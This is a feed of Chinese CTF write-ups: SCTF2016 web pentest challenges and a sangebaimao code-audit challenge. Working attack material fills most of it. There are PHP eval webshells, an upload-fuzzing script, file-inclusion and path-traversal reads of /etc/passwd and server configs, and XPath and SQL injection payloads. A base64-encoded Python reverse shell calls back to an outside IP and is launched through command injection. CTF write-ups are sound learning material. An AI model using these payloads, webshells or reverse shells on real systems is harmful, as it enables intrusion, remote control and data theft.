<p>靠的就是Fuzz後綴名。</p>
<p>一開始猜測是能執行解析的後綴名，然而基本上都過濾了。最後才想到還有一個inc的後綴。</p>
<p>要不是我前不久折騰過Phar包、我還不會想起有這個麼和php相關的後綴名。</p>
<pre><code>&lt;?php
$phar = new Phar('virink.phar', 0, 'virink.phar');
$phar-&gt;buildFromDirectory(dirname(__FILE__) . '/virink');
$phar-&gt;setStub($phar-&gt;createDefaultStub('virink.php', 'virink.php'));
$phar-&gt;compressFiles(Phar::GZ);
?&gt;
</code></pre>
<p>生成一個<strong>virink.phar</strong>文件，你就會發現</p>
<pre><code>Extract_Phar::go(true);
$mimes = array(
'phps' =&gt; 2,
...，
'xsd' =&gt; 'text/plain',
'php' =&gt; 1,
'inc' =&gt; 1,
'avi' =&gt; 'video/avi',
...
</code></pre>
<p>若以，測試了下inc後綴，果真能夠執行。</p>
<p>出題人的腦洞果然牛逼。</p>
<p>關於文件名爆破，一開始Fuzz的時候、因為懶，所以順手寫了個PHP腳本的POC</p>
<pre><code>&lt;?php
date_default_timezone_set('UTC');
error_reporting(0);
function fuck($ext, $contents){
    $u = "4e79618700b44607c.jie.sangebaimao.com";
    $key = "file\";filename=shell.$ext\r\nContent-Type:image/jpeg\r\nv:v";  
    $fields[$key] = $contents;
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,"http://".$u."/admin/upload.php");
    curl_setopt($ch,CURLOPT_HEADER,true);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch,CURLOPT_POST,true);
    curl_setopt($ch,CURLOPT_POSTFIELDS,$fields);
    curl_setopt($ch,CURLOPT_BINARYTRANSFER,true);
    curl_setopt($ch, CURLOPT_COOKIE, 'YOU COOKIE');
    $result = curl_exec($ch);
    curl_close($ch);
    $tt = substr($result,strpos($result,'Date')+11,20);
    $t = strtotime($tt);
    if(strpos($result,'success') === FALSE)
        die('error');
    for($i = 10; $i&lt;100;$i++){
        $url = "http://".$u."/uploads/2016/05/".md5($t.$i).'.'.$ext;
        $f = file_get_contents($url);
        if ($f &amp;&amp; strpos($f,'virink') !== FALSE){
            print $url;
            break;
        }
    }
}
$contents =&lt;&lt;&lt;TEXT
&lt;?php eval(\$_POST[999]);?&gt;virink
TEXT;
$ext = 'inc';
fuck($ext, $contents);
?&gt;
</code></pre>
<p>代碼有點不簡潔、、懶得改了，將就著用吧。</p>
<p>成功getshell~~</p>
<h2>0x06 什麼鬼？Misc</h2>
<p>getshell之後果真很蛋疼，很奔溃！</p>
<blockquote>
<p>imstudy(214329772) 1:44:30<br />
我都说拿完shell内心是奔溃的了，你竟然不信我</p>
</blockquote>
<p>沒錯，<strong>imstudy</strong>就是出題人，少年，拿起你手中的狼牙棒，保證不打死就可以了~~</p>
<p>菜刀練上去，發現<code>/var/www/</code>目錄下是一個圖片<strong>flag.jpg</strong></p>
<p>神器 <strong>Stegsolve + WinHex</strong>，提取出來一個壓縮包，，裏面是一個flag.txt。</p>
<p>然而還不是真正的flag，反而是N多汗(x,y,z)格式的東西。0-255之間，猜測是RGB值。</p>
<p>這可能要畫圖。</p>
<p>統計了一下行數、還不是正規的正方形尺寸。</p>
<p>默默折騰出一個POC，完美折騰出圖片。</p>
<pre><code>#!/bin/env python
#-*- encoding: utf-8 -*-
# __author__ : Virink

from PIL import Image
import math

if __name__ == '__main__':
    count = len(open('flag.txt','r').readlines())
    j = int(math.sqrt(count))
    i = j+2
    for k in range(0,i/4):
        sx = i-k
        sy = j+k
        if (sx * sy) == count:
            break
    c = Image.new("RGB",(sx,sy))
    file = open('flag.txt')
    for x in range(0,sx):
        for y in range(0,sy):
            line = file.readline()#获取一行
            rgb = line.split(",")#分离rgb
            c.putpixel((x,y),(int(rgb[0]),int(rgb[1]),int(rgb[2])))
    c.show()
    c.save("flag.png")
</code></pre>
<p>通關，此時此刻，我的內心依舊崩潰中！</p>
<pre><code>FLAG ： miao{fb49ac8a528901913ea2c664c6a8d6a1}
</code></pre>
<p>转自 <a href="http://drops.wooyun.org/tips/16055">?乌云知识库</a></p>]]></description>
</item>
<item>
<title><![CDATA[SCTF2016 痛苦的滲透之路]]></title>
<pubDate>Mon, 09 May 2016 01:23:31 GMT</pubDate>
<link>http://www.virzz.com/2016_05_09_sctf2016_painful_penetrating_way</link>
<guid>http://www.virzz.com/2016_05_09_sctf2016_painful_penetrating_way</guid>
<description><![CDATA[<h1>SCTF2016 痛苦的滲透之路</h1>
<h2>0x00 前言</h2>
<p>這次的CTF玩的很酸爽，一共7個 WEB滲透 類的題目，這也是痛苦的開始。好好的審計，為何加那麼多高門檻。</p>
<h2>0x01 Pentest-homework-200</h2>
<p>http://homework.sctf.xctf.org.cn/</p>
<p>打開完整，就是登陸頁面，進入註冊。名字，年齡，上傳圖片。</p>
<p>順利登陸之後是顯示一張圖片。還有一個homework的鏈接。</p>
<p>點擊homework鏈接之後是一個包好頁面的網址。</p>
<pre><code>http://homework.sctf.xctf.org.cn/homework.php?homework=homework.txt
</code></pre>
<p>可以判定這是一個文件包含漏洞的腦洞。馬上試試上傳木馬圖片來包含。</p>
<p>必然的繼而，包含不成功。</p>
<p>讀取源碼來瞅瞅上傳功能出了什麼問題。</p>
<pre><code>http://homework.sctf.xctf.org.cn/homework.php?homework=php://filter/convert.base64-encode/resource=index.php
</code></pre>
<p>果斷成功讀取。然後把該讀取的源碼全都download下來。</p>
<p>通過審計代碼</p>
<pre><code>if(isset($_POST['upload'])){
$filename = $_FILES['uploaded']['name'];
$filetype = $_FILES['uploaded']['type'];
$filesize = $_FILES['uploaded']['size'];
$tmpname = $_FILES['uploaded']['tmp_name'];
$uploaddir = './upload/';
$target_path = $uploaddir.basename($filename);
$fileext = substr(strrchr($filename,"."),1);
if(($fileext == 'gif')&amp;&amp;($filetype == "image/gif")){
    {
        if(move_uploaded_file($tmpname,$target_path))
        {
        }
    }
    $im =imagecreatefromgif($target_path);
    srand(time());
    $newfilename = strval(rand()).".gif";
    $newimagepath = $uploaddir.$newfilename;
    imagegif($im,$newimagepath);
    unlink($target_path);
}else if(($fileext == 'jpg')&amp;&amp;($filetype == "image/jpeg")){
...
</code></pre>
<p>果然有點意思，上傳的圖片都經過<strong>imagecreatefromgif</strong>等函數處理過了。</p>
<p>但是這不是重點，重點是前面的<code>move_uploaded_file($tmpname,$target_path)</code></p>
<p>熟悉php代碼的應該都知道，只是已經成功上傳圖片了的。</p>
<p>成功上傳之後再進行處理並刪除源文件<code>unlink($target_path);</code>。</p>
<p>所以，這個題目是時間競爭，拼網速，拼人品。</p>
<p>上傳寫shell腳本的圖片馬</p>
<pre><code>fputs(fopen(base64_decode(dmlyLnBocA),w),base64_decode(PD9waHAgQGV2YWwoJF9QT1NUWyd2aXJpbmsnXSk7Pz4tLS0t));
</code></pre>
<p>brup 多線程訪問</p>
<pre><code>http://homework.sctf.xctf.org.cn/homework.php?homework=upload/virink.jpg
</code></pre>
<p>註冊上傳。。如果人品好，很快就成功了。</p>
<p>後來，發現，寫的shell莫名其妙就沒了，目測有人攪屎，然後我就寫到/tmp去了。2333333</p>
<p>webshell成功上傳了，但是發現，很多功能都被閹割掉了。</p>
<pre><code>ddisable_functions= passthru,exec,phpinfo,system,chroot,scandir,chgrp,chown,shell_exec,proc_open,proc_get_status,popen,ini_alter,ini_restore,dl,openlog,syslog,readlink,symlink,popepassthru,stream_socket_server,pcntl_exec
</code></pre>
<p>然後就是利用<em>PHP绕过open_basedir列目录</em>黑科技列目錄。</p>
<pre><code>virink=printf('&lt;b&gt;open_basedir : %s &lt;/b&gt;&lt;br /&gt;', ini_get('open_basedir'));$file_list = array();$it = new DirectoryIterator("glob:////home/wwwroot/default/web/*");foreach($it as $f) {    $file_list[] = $f-&gt;__toString();}$it = new DirectoryIterator("glob:///.*");foreach($it as $f) {    $file_list[] = $f-&gt;__toString();}sort($file_list);foreach($file_list as $f){echo "{$f}&lt;br/&gt;";}
</code></pre>
<p>然後就是讀取flag</p>
<pre><code>virink=echo file_get_contents('/home/wwwroot/default/web/4ff692fb12aa996e27f0a108bfc386c2');
</code></pre>
<p><strong>SCTF{g00d_Good_Stu6y}</strong></p>
<h2>0x02 Pentest-sycshell-200</h2>
<p>http://58.213.63.27:61180</p>
<p>右鍵查看源碼</p>
<pre><code>&lt;!-- 内部系统资料：http://sycshell.sycsec.com:61180/ --&gt;
</code></pre>
<p>改Hosts，然後用域名訪問。</p>
<p>再開源碼，解密jsfuck編碼，得到</p>
<pre><code>/W0Ca1N1CaiBuDa0/read.php?f=index
</code></pre>
<p>代碼審計，繞過後包含。</p>
<p>源碼：</p>
<pre><code>&lt;?php
    show_source(__FILE__);
    $pass = @$_GET['pass'];
    $a = "syclover";

    strlen($pass) &gt; 15 ? die("Don't Hack me!") : "";

    if(!is_numeric($pass) || preg_match('/0(x)?|-|\+|\s|^(\.|\d).*$/i',$pass)){
        die('error');
    }

    if($pass == 1 &amp;&amp;  $a[$pass] === "s"){
        $file = isset($_GET['f']) ? $_GET['f'].'.php' : 'index.php';
        @include $file;
    }
?&gt;
</code></pre>
<p>這裏有一個大腦洞！！！！有版本限制的。</p>
<p>根據提示：sycshell_tip 审计那部分好好看php的底层代码，另外方便大家一下58.213.63.27:61180/phpinfo.php</p>
<p>首先可以得到php 5.3.29版本。</p>
<p>版本漏洞,<code>%0b</code>(\v)可以繞過正則的<code>\s</code></p>
<pre><code>/?pass=%0b.1e1
</code></pre>
<p>php底層源碼</p>
<pre><code>while (*str == ' ' || *str == '\t' || *str == '\n' || *str == '\r' || *str == '\v' || *str == '\f') {
    str++;
    length--;
}
</code></pre>
<p>這個題目的另一個大脑洞就是<strong>phpinfo()+Lfi</strong></p>
<p>然後就是爆破吧、、2333</p>
<p>$pass繞過這個腦洞與phithon牛的一道題目類似的</p>
<blockquote>
<p>https://www.leavesongs.com/PENETRATION/some-sangebaimao-ctf-writeups.html?lan=tw&amp;lan=tw&amp;lan=tw</p>
<p>题三：<em>PHP类型与逻辑+fuzz与源代码审计</em>的<em>0x03 函数特性导致绕过</em>部分。</p>
</blockquote>
<h2>0x03 Pentest-DrugMarket1-300</h2>
<p>Drug Market: http://www.spentest.com/</p>
<p>一開始就是一個腦洞，偽404 Not Found頁面。我曾經吃過這方面的虧，然後就默默地看源碼，點開隱藏的鏈接了。</p>
<pre><code>http://drug.spentest.com/
</code></pre>
<p>點order可以提交數據，然後沒別的什麼功能了。可能存在xss。</p>
<p>我繼續看源碼，有發現一個鏈接。</p>
<pre><code>http://msgboard.spentest.com/
</code></pre>
<p>打開頁面直接跳轉到</p>
<pre><code>http://msgboard.spentest.com/index.php?action=login.php
</code></pre>
<p>很明顯的一個文件包含漏洞。到處看了下，沒有上傳的地方。</p>
<p>再來研究頁面功能，客戶登陸，隨便填寫用戶名和聯繫方式之後發現存在session。並且用戶名和聯繫方式並沒有過濾。</p>
<p>初步判斷是包含session。習慣性包含/tmp/sess_xxxxxxxxxx,發現並不存在。絕逼改地方了。</p>
<p>然後就是要尋找session的存放地址。首先就得讀取apache的配置文件。</p>
<pre><code>http://msgboard.spentest.com/index.php?action=../../../../../../../../etc/httpd/conf/httpd.conf
</code></pre>
<p>得到</p>
<pre><code>&lt;VirtualHost 0.0.0.0:80&gt;
    ServerAdmin Syclover
    DocumentRoot /var/www/html
        &lt;Directory "/var/www/html"&gt;
    AssignUserId apache apache
    php_value session.save_path "/var/lib/php/session"
&lt;/VirtualHost&gt;
&lt;VirtualHost 0.0.0.0:80&gt;
    ServerAdmin Syclover
    ServerName www.spentest.com
    DocumentRoot /var/www/webhosts/www
        &lt;Directory "/var/www/webhosts/www"&gt;
    AssignUserId www www
    php_value session.save_path "/var/lib/php/session_www"
&lt;/VirtualHost&gt;
&lt;VirtualHost 0.0.0.0:80&gt;
    ServerAdmin Syclover
    ServerName drug.spentest.com
    DocumentRoot /var/www/webhosts/drug
        &lt;Directory "/var/www/webhosts/drug"&gt;
    AssignUserId drug drug
    php_value session.save_path "/var/lib/php/session_drug"
&lt;/VirtualHost&gt;
&lt;VirtualHost 0.0.0.0:80&gt;
    ServerAdmin Syclover
    ServerName msgboard.spentest.com
    DocumentRoot /var/www/webhosts/msgboard
        &lt;Directory "/var/www/webhosts/msgboard"&gt;
    AssignUserId msgboard msgboard
    php_value session.save_path "/var/lib/php/session_msgboard"
&lt;/VirtualHost&gt;
</code></pre>
<p>順利知道session的存放地址為<code>/var/lib/php/session_msgboard</code></p>
<p>Username 或者 Contact 寫入 &lt;?php @eval($_POST['virink']);?&gt;</p>
<pre><code>http://msgboard.spentest.com/index.php?action=../../../../../../../../var/lib/php/session_msgboard/sess_rb2rbfrie8rku2n81dq52vghp0
</code></pre>
<p>然後就是進一步收集信息</p>
<pre><code>virink=phpinfo()
</code></pre>
<p>得到</p>
<pre><code>disable_functions=passthru,exec,system,chroot,scandir,chgrp,chown,shell_exec,proc_open,proc_get_status,popen,ini_alter,ini_restore,dl,openlog,syslog,readlink,symlink,popepassthru,stream_socket_server
</code></pre>
<p>其他站點都沒有訪問權限，默默地閱讀本站點的源碼。得到數據庫連接信息。</p>
<p>因為這個題目已經被FB了，默默地去收集前輩們的信息。/tmp目錄是我的最愛。。。23333</p>
<p>看了一大堆沒用的東西，同時也得到了一些有用的東西，比如mysql的root密碼。。23333</p>
<p>當時腦抽了，沒有好好保存，在/tmp被莫名其妙地清空後找不到mysql的數據庫相關信息了。</p>
<p>思路中斷，始終不知道如何執行命令。</p>
<p>反復研究提示</p>
<blockquote>
<ol>
<li>这是渗透题哟，所以请不要囿于你当前的Shell之中，想办法渗透到DRUG站点</li>
<li>为了让题目更加接近真实环境，所以防火墙规则较为严格</li>
</ol>
</blockquote>
<p>最後又回到XSS上面了。因為看過drug的數據庫，並沒有管理員用戶表。</p>
<p>orderX來X去沒效果，然後在小夥伴提示的情況下，X進adminconfig裏面，成功獲取cookie！</p>
<p>進入管理員頁面，發現存在一個下載圖片的功能。自己服務器監聽一個端口，服務器訪問自己的服務器，無果。</p>
<p>還是在小夥伴的提示下，監聽80端口。。才發現提示2是這個腦洞。</p>
<p>然後就收到了一個wget請求。</p>
<p>目測存在命令執行漏洞。</p>
<p><strong>黑科技 ： $IFS 代替 空格</strong></p>
<p>上傳一個反彈的py腳本</p>
<pre><code>virink=fputs(fopen('/tmp/vvv.py',w),base64_decode(aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zDQpzPXNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsc29ja2V0LlNPQ0tfU1RSRUFNKQ0Kcy5jb25uZWN0KCgiNDUuNzguMTMuMjMiLDgwKSkNCm9zLmR1cDIocy5maWxlbm8oKSwwKQ0Kb3MuZHVwMihzLmZpbGVubygpLDEpDQpvcy5kdXAyKHMuZmlsZW5vKCksMikNCnA9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9iYXNoIiwiLWkiXSk7DQo));
</code></pre>
<p>然後執行命令</p>
<pre><code>http://vvv/flag.jpg;python$IFS/tmp/vvv.py
</code></pre>
<p>成功得到一個bash的shell。</p>
<p>最後在/home/drug找到flag1.txt</p>
<p><strong>SCTF{b68181af58bdf261714942f0d1a823be}</strong></p>
<h2>0x04 Pentest-ETO-200</h2>
<p>http://eto.sctf.xctf.org.cn/</p>
<p>這個是第一個放出來的題目，卻是最後才折騰出來。</p>
<p>簡單試一下，存在注入。</p>
<p>然後、各種注入都沒有成功。</p>
<p>官方給的提示奇葩：</p>
<blockquote>
<p>ETO相关 不用再尝试爆破了哈，另外hint一直都在</p>
</blockquote>
<p>從頭到尾都沒有發現hint在哪裡。</p>
<p>結束後才發現，注入報錯的時候，在響應頭裏面返回了一個<strong>hint：//user[id=1]</strong></p>
<p>出題人這個腦洞絕逼要給101分，滿分100，多一分是深深的父愛。</p>
<p>在小夥伴的提示下，才知道這是一個xpath注入。</p>
<p>引號被過濾了，但官方的提示2說好好利用已存在的字符。</p>
<p>說明，密碼中的字符在username、email和role中存在的。用substring()函數逐个字符判斷就ok了</p>
<pre><code>http://eto.sctf.xctf.org.cn/?action=user&amp;id=1 and substring(//user[1]/username,1,1)=substring(//user[1]/password,1,1)
</code></pre>
<p>用你的神器Burp再次爆破一波吧。</p>
<p>最后跑出32位的密码 ： <strong>Ywj@4791.d_gToWDmceu.Eali0s2yarn</strong></p>
<p>登陆后就可以得到Flag了</p>
<p><strong>SCTF{0f61ce4eb984a4a6d3aaa31f779533df}</strong></p>
<h2>0x05 Pentest-Hackme-300-未成功</h2>
<p>http://hackme.sctf.xctf.org.cn</p>
<p>坨坨的不会做，还是注入。注入一向是我的弱项。Orz......</p>
<p>根据官方的提示</p>
<blockquote>
<p>1.网站开发人员经常会去看备忘录<br />
2.想办法拿到管理员密码<br />
3.注意观察数据库连接方式<br />
4.XSS</p>
</blockquote>
<p>以及小伙伴的提示：PDO注入。</p>
<p>百度得到：PDO方式的数据库连接，可以insert注入。</p>
<p>折腾一番到也弄出个样子。</p>
<pre><code>http://hackme.sctf.xctf.org.cn/index.php?id=0;/*!50000insert*//*!50000into*/beiwanglu(id,time,event)/*!50000values*/(9,'virink',/*!50000select*/(/*!50000hex*/(/*!50000load_file*/(0x2F6574632F706173737764))));%23
</code></pre>
<p>成功X到了管理员的COOKIE。。。</p>
<p>再根据提示<strong>想办法拿到管理员密码</strong>可以大概知道下一步可能是劫持表单，获取管理员的密码。</p>
<p>然而，我就不会了。</p>
<p>XSS比SQL注入更渣~~Orz.....</p>
<h2>0x06 写在最后</h2>
<p>最终以0x01-0x04+签到10分的总分<strong>910分</strong>结束本次CTF。</p>
<p>脑洞还是不够大，经验太少。而且还犯傻。很多关键的地方和非关键地方都陷入了思维误区，没有小伙伴提示的话，我估计也就能拿个10分的签到分了。</p>]]></description>
</item>
<item>
<title><![CDATA[代碼審計-三個白帽-条条大路通罗马系列1]]></title>
<pubDate>Sat, 07 May 2016 22:07:08 GMT</pubDate>
<link>http://www.virzz.com/2016_05_07_code_audit_sangebaimao_ttdltlm_1</link>
<guid>http://www.virzz.com/2016_05_07_code_audit_sangebaimao_ttdltlm_1</guid>
<description><![CDATA[<h1>三個白帽-条条大路通罗马系列1</h1>
<h2>0x00 代碼審計</h2>
<p>首先，根據 tips 1: web 源码下载 sgbmwww.rar 下載源碼，然後就開始了審計。</p>
<p>大概看一下index.php的流程</p>
<pre><code>if($_M['form']['submit']){
    if($_M['form']['formname'] || $_FILES['file']['name']){
        $upfile = new upfile();
        $upfile-&gt;set('savepath', '');
        $upfile-&gt;set('is_rename', $_M['form']['is_rename']);
        $back = $upfile-&gt;upload($_M['form']['formname']);
    }

    $gb_array = [
        "name" =&gt; htmlspecialchars(filter($_M['form']['name'])),
        "message" =&gt; htmlspecialchars(filter($_M['form']['message'])),
        "filename" =&gt; $back,
    ];
    op($gb_array);
    $content = jsonencode($gb_array);
    $sql = "insert into guestbook(`content`) values('".$content."');";
    op($sql);
    $result = mysql_query($sql);
    if($result)
    {
        echo "thx for your feedback~";
    }else{
        op(mysql_error());
    }
}
</code></pre>
<p>主要是上傳漏洞getshell。</p>
<p>首先<code>include_once 'init.php';</code>初始化文件裏面再包含兩個文件<code>include 'config.php';include 'include.php';</code></p>
<p>config.php主要是數據庫配置。</p>
<p>include.php是一些公共函數，fifter和json處理。</p>
<pre><code>/*** 
获取GET,POST,COOKIE，存放在$_M['form']，系统表单提交变量数组
*/
$_M['form'] =array();
isset($_REQUEST['GLOBALS']) &amp;&amp; exit('Access Error');
foreach($_COOKIE as $_key =&gt; $_value) {
    $_key{0} != '_' &amp;&amp; $_M['form'][$_key] = daddslashes($_value);
}
foreach($_POST as $_key =&gt; $_value) {
    $_key{0} != '_' &amp;&amp; $_M['form'][$_key] = daddslashes($_value);
}
foreach($_GET as $_key =&gt; $_value) {
    $_key{0} != '_' &amp;&amp; $_M['form'][$_key] = daddslashes($_value);
}
</code></pre>
<p>再看upfile.php，一個上傳類。</p>
<p>獲取表單文件，過濾了php相關後綴</p>
<pre><code>//文件后缀是否为合法后缀
$this-&gt;getext($filear["name"]); //获取允许的后缀
if (strtolower($this-&gt;ext)=='php'||strtolower($this-&gt;ext)=='php3'||strtolower($this-&gt;ext)=='php4'||strtolower($this-&gt;ext)=='php5') {
    return false;
}
</code></pre>
<p>存在一個控制重命名功能</p>
<pre><code>//文件名重命名
$this-&gt;set_savename($filear["name"], $this-&gt;is_rename);
</code></pre>
<h2>0x01 非常規思路的黑科技</h2>
<p>顧名思義，非常規思路就是繞過了出題人的解題思路達到突破getflag的目的。</p>
<p>主要代碼</p>
<pre><code>if($_M['form']['formname'] || $_FILES['file']['name']){
    $upfile = new upfile();
    $upfile-&gt;set('savepath', '');
    $upfile-&gt;set('is_rename', $_M['form']['is_rename']);
    $back = $upfile-&gt;upload($_M['form']['formname']);
}
</code></pre>
<p>前天表單沒有<code>is_rename</code>這個參數，可以抓包自行添加。</p>
<p>根據代碼</p>
<pre><code>protected function set_savename($filename, $is_rename) {
if ($is_rename) {
    srand((double)microtime() * 1000000);
    $rnd = rand(100, 999);
    $filename = date('U') + $rnd;
    op(date('U') );
    $filename = $filename.".".$this-&gt;ext;   
} else {
</code></pre>
<p>當<code>is_rename</code>為假的情況就是直接取用發送的文件名而不重命名。既<code>is_rename=0</code>。</p>
<p>然後利用黑科技突破後綴的限制。</p>
<p>代碼裏限制了<strong>php、php3、php4、php5</strong>。但是忽略了<strong>pht</strong>這個也是能夠解析的後綴。</p>
<p>於是乎，秒破了。23333</p>
<blockquote>
<p>這個思路，略猥瑣的樣子。</p>
</blockquote>
<h2>0x02 常規思路</h2>
<p>其實一開始我不是用非常規思路。 也確實沒有第一時間想到pht這個黑科技。</p>
<pre><code>if($_M['form']['formname'] || $_FILES['file']['name']){
</code></pre>
<p>這裡存在倆個輸入輸入來源，此處必有蹊蹺。</p>
<p>然後，跟進<code>$back = $upfile-&gt;upload($_M['form']['formname']);</code></p>
<pre><code>public function upload($form = '') {
    global $_M;
    if (is_array($form)) {
        $filear = $form;
    }else{
        $filear = $_FILES[$form];
    }
    if(!$filear){
        foreach($_FILES as $key =&gt; $val){
            $filear = $_FILES[$key];
            break;
        }
    }
    ...
</code></pre>
<p>可以自定義<code>formname</code>參數而不用FILES表單。既<code>$filear = $form;</code>。</p>
<p>再往下看</p>
<pre><code>//复制文件
$upfileok=0;
$file_tmp=$filear["tmp_name"];
$file_name=$this-&gt;savepath.$this-&gt;savename;
if (function_exists("move_uploaded_file")) {
    if (move_uploaded_file($file_tmp, $file_name)) {
        $upfileok=1;
    } else if (copy($file_tmp, $file_name)) {
        $upfileok=1;
    }
} elseif (copy($file_tmp, $file_name)) {
    $upfileok=1;
}
if ($upfileok) {
    @unlink($filear['tmp_name']); //Delete temporary files
}
</code></pre>
<p>可以看到，參數<code>formname[name]</code>和<code>formname[tmp_name]</code>是可控的。</p>
<p>再看數據來源過濾，只是進行了一下簡單的<strong>addslashes</strong>轉義</p>
<pre><code>function daddslashes($string, $force = 0) {
    !defined('MAGIC_QUOTES_GPC') &amp;&amp; define('MAGIC_QUOTES_GPC', get_magic_quotes_gpc());
    if(!MAGIC_QUOTES_GPC || $force) {
        if(is_array($string)) {
            foreach($string as $key =&gt; $val) {
                $string[$key] = daddslashes($val, $force);
            }
        } else {
            $string = trim(addslashes($string));
        }
    }
    return $string;
}
</code></pre>
<p>於是就存在任意文件讀取了。</p>
<p><code>formname[tmp_name]</code>為任意文件，有讀取權限就能copy到upload目錄。</p>
<pre><code>formname[tmp_name]=../../../../../../../../etc/passwd
</code></pre>
<p>成功讀取到了。</p>
<p>然後再看http頭可以知道是nginx服務器，於是就翻找其配置文件。</p>
<p>為什麼要找配置文件呢。因為題目來有sql的insert，還有jsondeconde等函數在源碼裏面根本沒用上。</p>
<p>必定還存在其他的源碼。有根據挑戰介紹，<strong>WEB：三个白猫寻找后台之旅</strong>，必定存在後臺。</p>
<p>然而掃目錄並沒有發現，估計是存在另一個網站。</p>
<p>通過非常規思路getflag之後，我問了下出題人，</p>
<p><strong>沒想到這裡就是一個坑，由於結界是docker，通過反代理出來的。所以才顯示nginx，其實是apache服務器的。也確實存在另一個站點——後臺！</strong></p>
<p>這個常規也是之後複現的。</p>
<pre><code>formname[tmp_name]=../../../../../../../../etc/apache2/apache2.conf
formname[name]=vapache.txt
</code></pre>
<p>得到</p>
<pre><code>&lt;VirtualHost *:80&gt;
    ServerAdmin webmaster@localhost
    DocumentRoot /var/www/html/sgbmwww
&lt;/VirtualHost&gt;
&lt;VirtualHost *:8080&gt;
    ServerAdmin webmaster@localhost
    DocumentRoot /var/www/html/sgbmadmin
&lt;/VirtualHost&gt;
</code></pre>
<p>然後猜測sgbmadmin也存在源碼。</p>
<p>直接訪問8080端口是行不通的（出題人師傅說的，表示愣逼）</p>
<p>任意文件讀取再次走起，成功讀到了源碼包。</p>
<p>審計後臺的代碼。果斷發現用到了<code>jsondecode()</code>。</p>
<pre><code>function jsondecode($json){
    if($json){
        $convert = false;
        $str = '$arr=';
        for ($i=0; $i&lt;strlen($json); $i++){
            if (!$convert){
                if (($json[$i] == '{') || ($json[$i] == '[')){
                    $str .= ' array(';
                }else if (($json[$i] == '}') || ($json[$i] == ']')){
                    $str .= ')';
                }else if ($json[$i] == ':'){
                    $str .= '=&gt;';
                }else{
                    $str .= $json[$i];
                }                                    
            }else{
                $str .= $json[$i];
            }         
            if ($json[$i] == '"' &amp;&amp; $json[($i-1)]!="\\"){
                $convert = !$convert;
            }
        }
        $str = str_replace(array('\\\\' ,'\\/'), array('\\' ,'/'), $str);
        @eval($str . ';');
    }else{
        $arr = array();
    }
    return $arr;
}
</code></pre>
<p>很明顯，存在任意命令執行。</p>
<p>通過上傳一個非php解密後綴的文件，然後構造命令執行給文件改名達到getshell的目的。</p>
<p>命令執行是後臺文件才有的，所以要通過前臺頁面的文件包含漏洞調用。</p>
<p>首先，上傳一個vir.vir的shell文件。</p>
<p>回到index.php</p>
<pre><code>$gb_array = [
    "name" =&gt; htmlspecialchars(filter($_M['form']['name'])),
    "message" =&gt; htmlspecialchars(filter($_M['form']['message'])),
    "filename" =&gt; $back,
];
$content = jsonencode($gb_array);
$sql = "insert into guestbook(`content`) values('".$content."');";
</code></pre>
<p><strong>$back</strong>的數據沒有經過<code>htmlspecialchars(filter(</code>處理。</p>
<p>溯源，<code>$back = $upfile-&gt;upload($_M['form']['formname']);</code></p>
<p><code>$back</code>來自<code>$this-&gt;savename</code>。而<code>$this-&gt;savename</code>有一個特殊的過濾導致轉義的單引號逃逸了。</p>
<p>我們可以同截斷單引號，構造特殊語句，把命令插入到數據庫。</p>
<p>由於mysql的特性，<strong>insert into table</strong>語句可以插入多条数据。</p>
<pre><code>insert into guestbook(`content`) values('xxx'),('xxx');
</code></pre>
<p>我們在文件名輸入單引號<code>'</code>，進過轉義變成<code>\'</code>/,又因為</p>
<pre><code>protected function set_savename($filename, $is_rename) {
    if ($is_rename) {
        ...
    } else {
        ...
        $filename = str_replace(array(":", "*", "?", "|", "/" , "\\" , "\"" , "&lt;" , "&gt;" , "——" , " " ),'_',$filename);
        ...
</code></pre>
<p>使得<code>\'</code>變成了<code>_'</code>。</p>
<p>sql語句就編程了</p>
<pre><code>insert into guestbook(`content`) values('{"name":"a","message":"a","filename":"upload\/_'"}');
</code></pre>
<p><strong>#、（</strong> 和 <strong>）</strong> 都沒有過濾，構造閉合第一條數據，再構造第二條命令數據，然後用 <strong>#</strong> 截斷。</p>
<p>命令數據轉16進制插入數據庫就ok了</p>
<pre><code>system('mv /var/www/html/sgbmwww/upload/vir.vir /var/www/html/sgbmwww/upload/vir.php')
</code></pre>
<p>轉</p>
<pre><code>0x73797374656D28276D76202F7661722F7777772F68746D6C2F7367626D7777772F75706C6F61642F7669722E766972202F7661722F7777772F68746D6C2F7367626D7777772F75706C6F61642F7669722E7068702729
</code></pre>
<p>既</p>
<pre><code>formname[name]='),(0x73797374656D28276D76202F7661722F7777772F68746D6C2F7367626D7777772F75706C6F61642F7669722E766972202F7661722F7777772F68746D6C2F7367626D7777772F75706C6F61642F7669722E7068702729)#
formname[tmp_name]=任意內容
</code></pre>
<p>成功插入命令數據之後訪問</p>
<pre><code>http://521fe8480e00135dc.jie.sangebaimao.com/index.php?class=../sgbmadmin/index
</code></pre>
<p>基本上就能成功執行任意命令，修改文件名getshell了。</p>
<p>出題人還很貼心，怕你的命令被別人刷沒，特意用</p>
<pre><code>$sql = "select id,content from guestbook where content like '%".$_M['form']['search']."%' order by id desc limit 0,1;";
</code></pre>
<p>search一下你的命令就完美執行了。</p>]]></description>
</item>
<item>
<title><![CDATA[简单总结一下雨神的审计题目]]></title>
<pubDate>Sun, 24 Apr 2016 22:26:18 GMT</pubDate>
<link>http://www.virzz.com/2016_04_24_briefly_summarizes_the_rain_god_audit_subject</link>
<guid>http://www.virzz.com/2016_04_24_briefly_summarizes_the_rain_god_audit_subject</guid>
<description><![CDATA[<h2>0x00</h2>
<p>鏈接估計失效了、就不發出來了。</p>
<h2>0x01 任意文件讀取</h2>
<p>說好的源碼審計、居然就跳到了sql注入。</p>
<p>看了下robors.txt頁面，有亮點！</p>
<p>基本文件都寫出來了。</p>
<pre><code>User-agent: *
Disallow: /login.php
Disallow: /read.php
Disallow: /index.php
Disallow: /common.php
Disallow: /search.php
Disallow: /function.php
</code></pre>
<p><strong>read.php</strong></p>
<p>打開頁面，提示<code>The file parameter is empty,Please input it</code></p>
<p>根據提示加上<code>?file=read.php</code></p>
<p>又是提示<code>The parameter is not allow contain php!</code></p>
<p>簡單測試下,這樣就成功讀取了。<code>?file=/read.php</code></p>
<h2>0x02 MySQL的特性Like</h2>
<p>這題視乎在哪裏見過的樣子。</p>
<pre><code>&lt;?php
if(!empty($search)){
